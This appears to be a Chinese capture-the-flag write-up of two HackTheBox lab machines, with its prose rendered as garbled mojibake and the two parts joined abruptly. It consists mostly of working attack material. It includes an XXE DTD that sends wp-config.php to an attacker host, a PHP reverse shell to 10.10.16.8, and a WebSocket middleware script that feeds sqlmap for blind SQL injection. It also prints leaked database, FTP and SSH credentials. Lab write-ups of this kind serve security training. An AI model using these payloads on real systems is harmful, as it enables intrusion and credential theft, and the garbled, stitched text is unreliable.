&quot;cm9vdDp4OjA6MDpyb290Oi9yb290Oi9iaW4vYmFzaApkYWVtb246eDoxOjE6ZGFlbW9uOi91c3Ivc2JpbjovdXNyL3NiaW4vbm9sb2dpbgpiaW46eDoyOjI6YmluOi9iaW46L3Vzci9zYmluL25vbG9naW4Kc3lzOng6MzozOnN5czovZGV2Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5bmM6eDo0OjY1NTM0OnN5bmM6L2JpbjovYmluL3N5bmMKZ2FtZXM6eDo1OjYwOmdhbWVzOi91c3IvZ2FtZXM6L3Vzci9zYmluL25vbG9naW4KbWFuOng6NjoxMjptYW46L3Zhci9jYWNoZS9tYW46L3Vzci9zYmluL25vbG9naW4KbHA6eDo3Ojc6bHA6L3Zhci9zcG9vbC9scGQ6L3Vzci9zYmluL25vbG9naW4KbWFpbDp4Ojg6ODptYWlsOi92YXIvbWFpbDovdXNyL3NiaW4vbm9sb2dpbgpuZXdzOng6OTo5Om5ld3M6L3Zhci9zcG9vbC9uZXdzOi91c3Ivc2Jpbi9ub2xvZ2luCnV1Y3A6eDoxMDoxMDp1dWNwOi92YXIvc3Bvb2wvdXVjcDovdXNyL3NiaW4vbm9sb2dpbgpwcm94eTp4OjEzOjEzOnByb3h5Oi9iaW46L3Vzci9zYmluL25vbG9naW4Kd3d3LWRhdGE6eDozMzozMzp3d3ctZGF0YTovdmFyL3d3dzovdXNyL3NiaW4vbm9sb2dpbgpiYWNrdXA6eDozNDozNDpiYWNrdXA6L3Zhci9iYWNrdXBzOi91c3Ivc2Jpbi9ub2xvZ2luCmxpc3Q6eDozODozODpNYWlsaW5nIExpc3QgTWFuYWdlcjovdmFyL2xpc3Q6L3Vzci9zYmluL25vbG9naW4KaXJjOng6Mzk6Mzk6aXJjZDovcnVuL2lyY2Q6L3Vzci9zYmluL25vbG9naW4KZ25hdHM6eDo0MTo0MTpHbmF0cyBCdWctUmVwb3J0aW5nIFN5c3RlbSAoYWRtaW4pOi92YXIvbGliL2duYXRzOi91c3Ivc2Jpbi9ub2xvZ2luCm5vYm9keTp4OjY1NTM0OjY1NTM0Om5vYm9keTovbm9uZXhpc3RlbnQ6L3Vzci9zYmluL25vbG9naW4KX2FwdDp4OjEwMDo2NTUzNDo6L25vbmV4aXN0ZW50Oi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtbmV0d29yazp4OjEwMToxMDI6c3lzdGVtZCBOZXR3b3JrIE1hbmFnZW1lbnQsLCw6L3J1bi9zeXN0ZW1kOi91c3Ivc2Jpbi9ub2xvZ2luCnN5c3RlbWQtcmVzb2x2ZTp4OjEwMjoxMDM6c3lzdGVtZCBSZXNvbHZlciwsLDovcnVuL3N5c3RlbWQ6L3Vzci9zYmluL25vbG9naW4KbWVzc2FnZWJ1czp4OjEwMzoxMDk6Oi9ub25leGlzdGVudDovdXNyL3NiaW4vbm9sb2dpbgpzc2hkOng6MTA0OjY1NTM0OjovcnVuL3NzaGQ6L3Vzci9zYmluL25vbG9naW4Kam5lbHNvbjp4OjEwMDA6MTAwMDpqbmVsc29uLCwsOi9ob21lL2puZWxzb246L2Jpbi9iYXNoCnN5c3RlbWQtdGltZXN5bmM6eDo5OTk6OTk5OnN5c3RlbWQgVGltZSBTeW5jaHJvbml6YXRpb246LzovdXNyL3NiaW4vbm9sb2dpbgpzeXN0ZW1kLWNvcmVkdW1wOng6OTk4Ojk5ODpzeXN0ZW1kIENvcmUgRHVtcGVyOi86L3Vzci9zYmluL25vbG9naW4KbXlzcWw6eDoxMDU6MTExOk15U1FMIFNlcnZlciwsLDovbm9uZXhpc3RlbnQ6L2Jpbi9mYWxzZQpwcm9mdHBkOng6MTA2OjY1NTM0OjovcnVuL3Byb2Z0cGQ6L3Vzci9zYmluL25vbG9naW4KZnRwOng6MTA3OjY1NTM0Ojovc3J2L2Z0cDovdXNyL3NiaW4vbm9sb2dpbgo=&quot; |base64 -d\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\nsystemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin\nsystemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin\nmessagebus:x:103:109::/nonexistent:/usr/sbin/nologin\nsshd:x:104:65534::/run/sshd:/usr/sbin/nologin\njnelson:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash\nsystemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin\nsystemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin\nmysql:x:105:111:MySQL Server,,,:/nonexistent:/bin/false\nproftpd:x:106:65534::/run/proftpd:/usr/sbin/nologin\nftp:x:107:65534::/srv/ftp:/usr/sbin/nologin\n\nå¾—åˆ°&#x2F;etc&#x2F;passwdå†…å®¹\nWordPressçš„é…ç½®æ–‡ä»¶ä¸ºwp-config.php,æ¥ä¸‹æ¥å°è¯•è¯»å–\nå°†dedsec.dtdæ›´æ”¹\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# cat dedsec.dtd \n&lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/var/www/metapress.htb/blog/wp-config.php&quot;&gt;\n&lt;!ENTITY % init &quot;&lt;!ENTITY &amp;#x25; trick SYSTEM &#39;http://10.10.16.8:9999/?p=%file;&#39;&gt;&quot; &gt;\n\nä¸Šä¼ payload.waf,å›æ˜¾\n[Sat Feb 11 04:31:10 2023] 10.10.11.186:60128 Closing\n[Sat Feb 11 04:31:12 2023] 10.10.11.186:53418 Accepted\n[Sat Feb 11 04:31:13 2023] 10.10.11.186:53418 [200]: GET /dedsec.dtd\n[Sat Feb 11 04:31:13 2023] 10.10.11.186:53418 Closing\n[Sat Feb 11 04:31:15 2023] 10.10.11.186:53422 Accepted\n[Sat Feb 11 04:31:15 2023] 10.10.11.186:53422 [200]: GET /?p=PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==                                                                                                                             \n[Sat Feb 11 04:31:15 2023] 10.10.11.186:53422 Closing\n\nbase64è§£ç \nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# echo &quot;PD9waHANCi8qKiBUaGUgbmFtZSBvZiB0aGUgZGF0YWJhc2UgZm9yIFdvcmRQcmVzcyAqLw0KZGVmaW5lKCAnREJfTkFNRScsICdibG9nJyApOw0KDQovKiogTXlTUUwgZGF0YWJhc2UgdXNlcm5hbWUgKi8NCmRlZmluZSggJ0RCX1VTRVInLCAnYmxvZycgKTsNCg0KLyoqIE15U1FMIGRhdGFiYXNlIHBhc3N3b3JkICovDQpkZWZpbmUoICdEQl9QQVNTV09SRCcsICc2MzVBcUBUZHFyQ3dYRlVaJyApOw0KDQovKiogTXlTUUwgaG9zdG5hbWUgKi8NCmRlZmluZSggJ0RCX0hPU1QnLCAnbG9jYWxob3N0JyApOw0KDQovKiogRGF0YWJhc2UgQ2hhcnNldCB0byB1c2UgaW4gY3JlYXRpbmcgZGF0YWJhc2UgdGFibGVzLiAqLw0KZGVmaW5lKCAnREJfQ0hBUlNFVCcsICd1dGY4bWI0JyApOw0KDQovKiogVGhlIERhdGFiYXNlIENvbGxhdGUgdHlwZS4gRG9uJ3QgY2hhbmdlIHRoaXMgaWYgaW4gZG91YnQuICovDQpkZWZpbmUoICdEQl9DT0xMQVRFJywgJycgKTsNCg0KZGVmaW5lKCAnRlNfTUVUSE9EJywgJ2Z0cGV4dCcgKTsNCmRlZmluZSggJ0ZUUF9VU0VSJywgJ21ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfUEFTUycsICc5TllTX2lpQEZ5TF9wNU0yTnZKJyApOw0KZGVmaW5lKCAnRlRQX0hPU1QnLCAnZnRwLm1ldGFwcmVzcy5odGInICk7DQpkZWZpbmUoICdGVFBfQkFTRScsICdibG9nLycgKTsNCmRlZmluZSggJ0ZUUF9TU0wnLCBmYWxzZSApOw0KDQovKiojQCsNCiAqIEF1dGhlbnRpY2F0aW9uIFVuaXF1ZSBLZXlzIGFuZCBTYWx0cy4NCiAqIEBzaW5jZSAyLjYuMA0KICovDQpkZWZpbmUoICdBVVRIX0tFWScsICAgICAgICAgJz8hWiR1R08qQTZ4T0U1eCxwd2VQNGkqejttYHwuWjpYQClRUlFGWGtDUnlsN31gclhWRz0zIG4+KzNtPy5CLzonICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9LRVknLCAgJ3gkaSQpYjBdYjFjdXA7NDdgWVZ1YS9KSHElKjhVQTZnXTBid29FVzo5MUVaOWhdcldsVnElSVE2NnBmez1dYSUnICk7DQpkZWZpbmUoICdMT0dHRURfSU5fS0VZJywgICAgJ0orbXhDYVA0ejxnLjZQXnRgeml2PmRkfUVFaSU0OCVKblJxXjJNakZpaXRuIyZuK0hYdl18fEUrRn5De3FLWHknICk7DQpkZWZpbmUoICdOT05DRV9LRVknLCAgICAgICAgJ1NtZURyJCRPMGppO145XSpgfkdOZSFwWEBEdldiNG05RWQ9RGQoLnItcXteeihGPyk3bXhOVWc5ODZ0UU83TzUnICk7DQpkZWZpbmUoICdBVVRIX1NBTFQnLCAgICAgICAgJ1s7VEJnYy8sTSMpZDVmW0gqdGc1MGlmVD9adi41V3g9YGxAdiQtdkgqPH46MF1zfWQ8Jk07Lix4MHp+Uj4zIUQnICk7DQpkZWZpbmUoICdTRUNVUkVfQVVUSF9TQUxUJywgJz5gVkFzNiFHOTU1ZEpzPyRPNHptYC5RO2FtaldedUpya18xLWRJKFNqUk9kV1tTJn5vbWlIXmpWQz8yLUk/SS4nICk7DQpkZWZpbmUoICdMT0dHRURfSU5fU0FMVCcsICAgJzRbZlNeMyE9JT9ISW9wTXBrZ1lib3k4LWpsXmldTXd9WSBkfk49Jl5Kc0lgTSlGSlRKRVZJKSBOI05PaWRJZj0nICk7DQpkZWZpbmUoICdOT05DRV9TQUxUJywgICAgICAgJy5zVSZDUUBJUmxoIE87NWFzbFkrRnE4UVdoZVNOeGQ2VmUjfXchQnEsaH1WOWpLU2tUR3N2JVk0NTFGOEw9YkwnICk7DQoNCi8qKg0KICogV29yZFByZXNzIERhdGFiYXNlIFRhYmxlIHByZWZpeC4NCiAqLw0KJHRhYmxlX3ByZWZpeCA9ICd3cF8nOw0KDQovKioNCiAqIEZvciBkZXZlbG9wZXJzOiBXb3JkUHJlc3MgZGVidWdnaW5nIG1vZGUuDQogKiBAbGluayBodHRwczovL3dvcmRwcmVzcy5vcmcvc3VwcG9ydC9hcnRpY2xlL2RlYnVnZ2luZy1pbi13b3JkcHJlc3MvDQogKi8NCmRlZmluZSggJ1dQX0RFQlVHJywgZmFsc2UgKTsNCg0KLyoqIEFic29sdXRlIHBhdGggdG8gdGhlIFdvcmRQcmVzcyBkaXJlY3RvcnkuICovDQppZiAoICEgZGVmaW5lZCggJ0FCU1BBVEgnICkgKSB7DQoJZGVmaW5lKCAnQUJTUEFUSCcsIF9fRElSX18gLiAnLycgKTsNCn0NCg0KLyoqIFNldHMgdXAgV29yZFByZXNzIHZhcnMgYW5kIGluY2x1ZGVkIGZpbGVzLiAqLw0KcmVxdWlyZV9vbmNlIEFCU1BBVEggLiAnd3Atc2V0dGluZ3MucGhwJzsNCg==&quot; |base64 -d\n&lt;?php\n                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 \n?&gt; \n\nä¸Šä¼ æ—¶ï¼Œæ³¨æ„ï¼Œæˆ‘ä»¬åªåœ¨&#x2F;tiny&#x2F;uploadsç›®å½•ä¸‹æœ‰å†™å…¥æƒé™\n\nå‘½ä»¤æ‰§è¡ŒæˆåŠŸ\næ¥ä¸‹æ¥å°±å¯ä»¥ä¸Šä¼ ä¸€ä¸ªåå¼¹shellçš„æ–‡ä»¶\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/æ¡Œé¢]\nâ””â”€# cat n3ym4r.php                                                                                           \n&lt;?php\nsystem(&quot;bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/10.10.16.8/6666&lt;&amp;1&#39;&quot;)\n?&gt;\n\nncç›‘å¬\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# nc -lvvp 6666            \nNcat: Version 7.92 ( https://nmap.org/ncat )\nNcat: Listening on :::6666\nNcat: Listening on 0.0.0.0:6666\nxzc\nls\nNcat: Connection from 10.10.11.194.\nNcat: Connection from 10.10.11.194:47232.\nbash: cannot set terminal process group (1044): Inappropriate ioctl for device\nbash: no job control in this shell\nwww-data@soccer:~/html/tiny/uploads$ ls\nn3ym4r.php\n\nå­åŸŸåå‘ç°åå¼¹æˆåŠŸï¼Œåˆ°å¤„æŸ¥çœ‹æ–‡ä»¶\nwww-data@soccer:/etc$ cd ..\ncd ..\nwww-data@soccer:/$ cat /etc/hosts\ncat /etc/hosts\n127.0.0.1       localhost       soccer  soccer.htb      soc-player.soccer.htb\n\n127.0.1.1       ubuntu-focal    ubuntu-focal\n\nåœ¨&#x2F;etc&#x2F;hostsæ–‡ä»¶å‘ç°ï¼Œè¿˜ç»‘å®šäº†ä¸€ä¸ªå­åŸŸåï¼Œå°†ä»–åŠ å…¥æœ¬åœ°&#x2F;etc&#x2F;hostsï¼Œè®¿é—®\n\n&lt;script&gt;\n        var ws = new WebSocket(&quot;ws://soc-player.soccer.htb:9091&quot;);\n        window.onload = function () &#123;\n        \n        var btn = document.getElementById(&#39;btn&#39;);\n        var input = document.getElementById(&#39;id&#39;);\n        \n        ws.onopen = function (e) &#123;\n            console.log(&#39;connected to the server&#39;)\n        &#125;\n        input.addEventListener(&#39;keypress&#39;, (e) =&gt; &#123;\n            keyOne(e)\n        &#125;);\n        \n        function keyOne(e) &#123;\n            e.stopPropagation();\n            if (e.keyCode === 13) &#123;\n                e.preventDefault();\n                sendText();\n            &#125;\n        &#125;\n        \n        function sendText() &#123;\n            var msg = input.value;\n            if (msg.length &gt; 0) &#123;\n                ws.send(JSON.stringify(&#123;\n                    &quot;id&quot;: msg\n                &#125;))\n            &#125;\n            else append(&quot;????????&quot;)\n        &#125;\n        &#125;\n        \n        ws.onmessage = function (e) &#123;\n        append(e.data)\n        &#125;\n        \n        function append(msg) &#123;\n        let p = document.querySelector(&quot;p&quot;);\n        // let randomColor = &#39;#&#39; + Math.floor(Math.random() * 16777215).toString(16);\n        // p.style.color = randomColor;\n        p.textContent = msg\n        &#125;\n    &lt;/script&gt;\n\nè¯¥ä»£ç åœ¨ URL â€œws:&#x2F;&#x2F;soc-player.soccer.htb:9091â€ å¤„å»ºç«‹åˆ°æœåŠ¡å™¨çš„æ–° WebSocket è¿æ¥ã€‚åŠ è½½é¡µé¢æ—¶ï¼Œå®ƒä¼šè®¾ç½®ä¸€ä¸ªäº‹ä»¶ä¾¦å¬å™¨ï¼Œç”¨äºå½“ç”¨æˆ·åœ¨ ID ä¸ºâ€œidâ€çš„è¾“å…¥å…ƒç´ ä¸­æŒ‰ä¸‹â€œEnterâ€é”®æ—¶ã€‚å½“æŒ‰ä¸‹â€œEnterâ€é”®æ—¶ï¼Œè°ƒç”¨å‡½æ•°â€œsendTextâ€ã€‚ â€œsendTextâ€å‡½æ•°ç”¨äºé€šè¿‡ WebSocket è¿æ¥å‘æœåŠ¡å™¨å‘é€æ¶ˆæ¯ã€‚è¯¥æ¶ˆæ¯ç”±ä¸€ä¸ª JSON å¯¹è±¡ç»„æˆï¼Œè¯¥å¯¹è±¡å…·æœ‰å•ä¸ªå±æ€§â€œidâ€å’Œä¸€ä¸ªç­‰äºè¾“å…¥å…ƒç´ å€¼çš„å€¼ã€‚è¯¥ä»£ç è¿˜æœ‰ä¸€ä¸ªåä¸ºâ€œappendâ€çš„å‡½æ•°ï¼Œå½“ WebSocket è¿æ¥ä»æœåŠ¡å™¨æ¥æ”¶åˆ°æ¶ˆæ¯æ—¶è°ƒç”¨è¯¥å‡½æ•°.è¯¥å‡½æ•°å°†æ¶ˆæ¯ä½œä¸ºå‚æ•°å¹¶å°†â€œpâ€å…ƒç´ çš„æ–‡æœ¬å†…å®¹è®¾ç½®ä¸ºæ¶ˆæ¯ã€‚\nè¾“å…¥å‚æ•°å¯èƒ½å®¹æ˜“å—åˆ° sqli æ³¨å…¥æ”»å‡»,googleä¸€ä¸‹\nwebsocket sqlæ³¨å…¥æ¼æ´åˆ©ç”¨\nhttps://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html\né“¾æ¥å†…å®¹è®²çš„å¾ˆæ¸…æ¥šï¼Œè¿™é‡Œä¸å†èµ˜è¿°ï¼Œå°†è„šæœ¬çš„å†…å®¹åšäº›å¿…è¦çš„æ›´æ”¹,å°†ws_serverå’Œdataå‚æ•°è¿›è¡Œä¿®æ”¹\nfrom http.server import SimpleHTTPRequestHandler\nfrom socketserver import TCPServer\nfrom urllib.parse import unquote, urlparse\nfrom websocket import create_connection\n\nws_server = &quot;ws://soc-player.soccer.htb:9091&quot;\n\ndef send_ws(payload):\n    ws = create_connection(ws_server)\n    # If the server returns a response on connect, use below line\t\n    #resp = ws.recv() # If server returns something like a token on connect you can find and extract from here\n    \n    # For our case, format the payload in JSON\n    message = unquote(payload).replace(&#39;&quot;&#39;,&#39;\\&#39;&#39;) # replacing &quot; with &#39; to avoid breaking JSON structure\n    data = &#39;&#123;&quot;id&quot;:&quot;%s&quot;&#125;&#39; % message\n\n    ws.send(data)\n    resp = ws.recv()\n    ws.close()\n\n    if resp:\n        return resp\n    else:\n        return &#39;&#39;\n\ndef middleware_server(host_port,content_type=&quot;text/plain&quot;):\n\n    class CustomHandler(SimpleHTTPRequestHandler):\n        def do_GET(self) -&gt; None:\n            self.send_response(200)\n            try:\n                payload = urlparse(self.path).query.split(&#39;=&#39;,1)[1]\n            except IndexError:\n                payload = False\n                \n            if payload:\n                content = send_ws(payload)\n            else:\n                content = &#39;No parameters specified!&#39;\n\n            self.send_header(&quot;Content-type&quot;, content_type)\n            self.end_headers()\n            self.wfile.write(content.encode())\n            return\n\n    class _TCPServer(TCPServer):\n        allow_reuse_address = True\n\n    httpd = _TCPServer(host_port, CustomHandler)\n    httpd.serve_forever()\n\n\nprint(&quot;[+] Starting MiddleWare Server&quot;)\nprint(&quot;[+] Send payloads in http://localhost:8081/?id=*&quot;)\n\ntry:\n    middleware_server((&#39;0.0.0.0&#39;,8081))\nexcept KeyboardInterrupt:\n    pass\n\nå¼€ä¸ªç»ˆç«¯æ‰§è¡Œæ­¤è„šæœ¬ï¼Œå¦å¼€ä¸€ç»ˆç«¯å¯¹æ‰˜ç®¡åˆ°8081çš„çš„ä¸­é—´æœåŠ¡å™¨æ‰§è¡Œsqlmap\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# sqlmap -u &quot;http://localhost:8081/?id=1&quot; -p &quot;id&quot; --dbs\n        ___\n       __H__\n ___ ___[&quot;]_____ ___ ___  &#123;1.7#stable&#125;\n|_ -| . [&quot;]     | .&#39;| . |\n|___|_  [&quot;]_|_|_|__,|  _|\n      |_|V...       |_|   https://sqlmap.org\n\nç”±äºæ˜¯sqlç›²æ³¨ï¼Œæ‰€ä»¥ç­‰å¾…æ—¶é—´ç¨å¾®æœ‰ç‚¹é•¿\navailable databases [5]:\n[*] information_schema\n[*] mysql\n[*] performance_schema\n[*] soccer_db\n[*] sys\n\n[01:22:45] [INFO] fetched data logged to text files under &#39;/root/.local/share/sqlmap/output/localhost&#39;\n\n[*] ending @ 01:22:45 /2023-02-12/\n\nå¾—åˆ°player:PlayerOftheMatch2022\nsshè¿æ¥â”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# ssh player@10.10.11.194\nThe authenticity of host &#39;10.10.11.194 (10.10.11.194)&#39; can&#39;t be established.\nECDSA key fingerprint is SHA256:Ke/TB8v0VkzfMGP9JasA7Vb22F4d1X6hyU/U5+8JKws.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nWarning: Permanently added &#39;10.10.11.194&#39; (ECDSA) to the list of known hosts.\nplayer@10.10.11.194&#39;s password: \nWelcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-135-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n  System information as of Sun Feb 12 06:10:09 UTC 2023\n\n  System load:           0.08\n  Usage of /:            70.6% of 3.84GB\n  Memory usage:          26%\n  Swap usage:            0%\n  Processes:             241\n  Users logged in:       0\n  IPv4 address for eth0: 10.10.11.194\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:2be6\n\n\n0 updates can be applied immediately.\n\n\nThe list of available updates is more than a week old.\nTo check for new updates run: sudo apt update\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\n\nLast login: Sat Feb 11 14:34:29 2023 from 10.10.14.154\nplayer@soccer:~$ ls\nlinpeas.sh  snap  user.txt\nplayer@soccer:~$ cat user.txt\n8cf79e0f16b3ea6d7a7f433dd606b117\n\nå¾—åˆ°user flag\nææƒæ‰§è¡Œsudo -l\nplayer@soccer:~$ sudo -l\n[sudo] password for player: \nSorry, user player may not run sudo on 